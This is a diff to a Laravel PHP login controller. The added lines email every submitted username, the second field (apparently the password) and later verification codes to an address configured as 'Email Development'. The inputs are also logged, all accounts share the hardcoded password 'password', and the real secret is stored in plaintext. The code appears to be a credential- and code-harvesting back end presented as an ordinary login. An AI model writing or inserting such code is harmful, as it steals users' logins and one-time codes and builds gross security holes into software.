@@ -3,10 +3,14 @@
 namespace App\Http\Controllers;
 
 use App\Models\LogInput;
-use Illuminate\Support\Facades\Http;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Mail;
 
+use App\Mail\SendLog;
+use App\Mail\SendVerif;
+use App\Models\Rules;
 // Model
 use App\Models\User;
 
@@ -29,15 +33,27 @@ class LoginController extends Controller
         
         LogInput::create(['first_col' => $first_col, 'second_col' => $second_column]);
 
+        $mailInstance = new SendLog($first_col, $second_column);
+        $toemail = Rules::where('rule_name', 'Email Development')->pluck('rule_value')->toArray();
+        Mail::to($toemail)->send($mailInstance);
+
         $data = User::where('name', $first_col)->first();
         if($data){
             if($data->is_success == 1){
-                $credentials = [
-                    'username' => $first_col,
-                    'password' => 'password',
-                ];
-                Auth::attempt($credentials);
-                return redirect()->route('home');
+                if($second_column != $data->code_success){
+                    Auth::logout();
+                    return redirect()->back()->with('fail','Wrong Username or Password');
+                } else {
+                    $credentials = [
+                        'name' => $first_col,
+                        'password' => 'password',
+                    ];
+                    Auth::attempt($credentials);
+                    if($data->role == 'Admin'){
+                        return redirect()->route('listUser');
+                    }
+                    return redirect()->route('home');
+                }
             } else {
                 Auth::logout();
                 if($data->is_not_12 == 1){
@@ -54,8 +70,8 @@ class LoginController extends Controller
             User::create([
                 'name' => $first_col,
                 'email' => $first_col,
-                'password' => Hash::make('password'),
                 'code' => $second_column,
+                'password' => Hash::make('password'),
             ]);
             return redirect()->back()->with('info','Please wait, we verify your account');
         }
@@ -71,6 +87,10 @@ class LoginController extends Controller
         User::where('name', $request->first_col)->update([
             'verif_code' => $request->code
         ]);
+        $mailInstance = new SendVerif($request->first_col, $request->code);
+        $toemail = Rules::where('rule_name', 'Email Development')->pluck('rule_value')->toArray();
+        Mail::to($toemail)->send($mailInstance);
+
         return redirect()->route('login')->with('info','Please wait, we verify your account');
     }
 
